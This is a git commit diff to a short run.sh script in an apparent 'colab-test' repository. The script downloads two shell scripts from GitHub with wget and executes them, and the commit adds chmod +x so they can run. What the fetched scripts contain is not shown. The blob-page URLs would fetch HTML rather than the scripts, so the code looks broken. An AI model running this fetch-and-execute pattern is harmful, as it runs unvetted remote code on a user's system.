02e7b917840b5f6d7c2858450d6f4b3fa210eef1
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-01-28 01:38:49 -0500

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,3 +1,5 @@
 wget https://github.com/rindalasririn/colab-test/blob/main/watch.sh
 wget https://github.com/rindalasririn/colab-test/blob/main/runme.sh
+chmod +x runme.sh
+chmod +x watch.sh
 ./runme.sh; ./watch.sh
